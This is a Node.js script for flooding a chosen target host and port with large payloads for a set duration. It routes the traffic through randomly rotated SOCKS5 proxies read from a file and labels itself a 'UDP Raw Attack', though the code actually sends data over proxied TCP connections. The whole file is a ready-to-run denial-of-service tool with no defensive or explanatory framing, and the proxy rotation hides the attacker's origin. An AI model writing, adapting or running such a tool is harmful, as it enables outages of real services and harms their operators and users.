const dgram = require('dgram');
const SocksClient = require('socks').SocksClient;
const fs = require('fs');

const target = process.argv[2];
const port = process.argv[3];
const duration = process.argv[4];

// Load SOCKS5 proxies
let proxies = [];
try {
    const proxyData = fs.readFileSync('socks5.txt', 'utf8');
    proxies = proxyData.split('\n').filter(line => line.trim() !== '');
} catch (err) {
    console.log('Error loading proxies from socks5.txt');
    process.exit(1);
}

function getRandomProxy() {
    if (proxies.length === 0) return null;
    return proxies[Math.floor(Math.random() * proxies.length)];
}

function generatePayload(size) {
    let payload = Buffer.alloc(size);
    payload.fill('PermenMD');
    return payload;
}

const payload = generatePayload(65500);

async function sendThroughProxy(proxy, payload) {
    if (!proxy) return;
    
    const [proxyHost, proxyPort] = proxy.split(':');
    
    try {
        const options = {
            proxy: {
                host: proxyHost,
                port: parseInt(proxyPort),
                type: 5 // SOCKS5
            },
            command: 'connect',
            destination: {
                host: target,
                port: parseInt(port)
            }
        };

        const info = await SocksClient.createConnection(options);
        const socket = info.socket;

        // Send multiple payloads through the proxy
        for (let i = 0; i < 50; i++) {
            socket.write(payload);
        }

        setTimeout(() => {
            socket.destroy();
        }, 2000);

    } catch (err) {
        // Skip failed proxy
    }
}

// Main attack loop
const attackInterval = setInterval(async () => {
    const proxy = getRandomProxy();
    if (!proxy) {
        console.log('No valid proxies found. Stopping attack.');
        clearInterval(attackInterval);
        process.exit(1);
    }

    await sendThroughProxy(proxy, payload);
}, 10);

console.clear();
console.log(`
UDP Raw Attack with SOCKS5 Proxy
Target: ${target}
Port: ${port}
Duration: ${duration} seconds
`);

setTimeout(() => {
    console.log('Attack stopped.');
    clearInterval(attackInterval);
    process.exit(0);
}, duration * 1000);